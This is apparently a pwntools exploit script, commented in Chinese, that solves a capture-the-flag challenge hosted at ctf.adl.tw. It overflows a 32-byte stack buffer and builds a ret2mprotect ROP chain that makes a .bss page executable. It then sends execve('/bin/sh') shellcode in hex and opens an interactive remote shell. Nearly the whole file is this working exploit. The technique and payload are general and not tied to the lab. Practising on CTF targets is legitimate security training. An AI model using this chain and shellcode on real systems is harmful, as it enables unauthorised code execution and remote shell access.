from pwn import *
import time

context.binary = e = ELF('yes_ya_gonna_jump', checksec=False)
context.log_level = 'info'

HOST, PORT = 'ctf.adl.tw', 10004   # 使用者已確認的 port

# --- 二進位邏輯（見 yes_ya_gonna_jump_writeup.md） ---
# char buf[0x20];                 // rbp-0x20, 32 bytes
# read(0, buf, 0xd0);             // 讀最多 208 bytes 進 32 bytes 的 buf -> 經典 overflow
# printf("You sang:%sIs this the correct song?\n", buf);
# （main 沒有做任何 canary 檢查，return address 直接可蓋）
#
# 這題是 statically linked + NX enabled，而且完全沒有 execve/system 這類
# 現成函式（為了拿 shell特地被連結器丟掉了），所以不能像前幾題一樣直接
# ret2win。可用的武器是 libc 裡現成的 mprotect()：
#   1. ROP 呼叫 mprotect(bss_page, 0x2000, PROT_READ|WRITE|EXEC)
#      把一塊 .bss（位址固定，因為 No PIE）變成可執行
#   2. ROP 呼叫 read(0, bss_page, 0x100)，把我們接下來送的 shellcode
#      讀進這塊剛剛變可執行的記憶體
#   3. ROP chain 最後一個位址直接是 bss_page 本身，"ret" 時就跳過去執行
#
# 這個手法叫 ret2mprotect：先用 ROP 放寬權限，再跳進自己提供的 shellcode，
# 完全不需要 execve/system 符號，也不需要洩漏任何位址（No PIE 讓 .text/.bss
# 都是寫死的常數）。

BUF_SIZE = 0x20
SAVED_RBP = 0x8
OFFSET = BUF_SIZE + SAVED_RBP        # 0x28 (40)，buf 起點到 return address 的距離

rop = ROP(e)
bss = e.bss(0x800)                   # 挑 .bss 裡一個離其他資料遠一點的位址
page = bss & ~0xfff                  # mprotect 要求位址對齊到 page (0x1000)
rop.mprotect(page, 0x2000, 7)        # PROT_READ(1)|PROT_WRITE(2)|PROT_EXEC(4) = 7
rop.read(0, page, 0x100)             # 把接下來送的 shellcode 讀進這塊記憶體
rop.raw(page)                        # ret 直接跳到 page，執行剛讀進去的 shellcode

overflow_payload = b'A' * OFFSET + rop.chain()
assert len(overflow_payload) <= 0xd0   # 176 <= 208，確定塞得進第一個 read()

# execve("/bin/sh", NULL, NULL)，25 bytes（跟 shellcode 題用的同一段）
shellcode = bytes.fromhex('4831f65648bf2f2f62696e2f7368574889e74831d2b03b0f05')

p = remote(HOST, PORT, timeout=10)

p.recvuntil(b'with me: ')
p.send(overflow_payload)

# 等第一個 read() 真的執行完、main() leave/ret 跳進 ROP chain，
# chain 裡的 read(0, page, 0x100) 也已經在等待資料之後，
# 才送 shellcode —— 兩個 read() 之間沒有任何文字輸出可以 recvuntil，
# 只能用小小的 sleep 保證順序正確（避免被同一個 read() 一次吃光）。
time.sleep(0.5)
p.send(shellcode)

p.interactive()
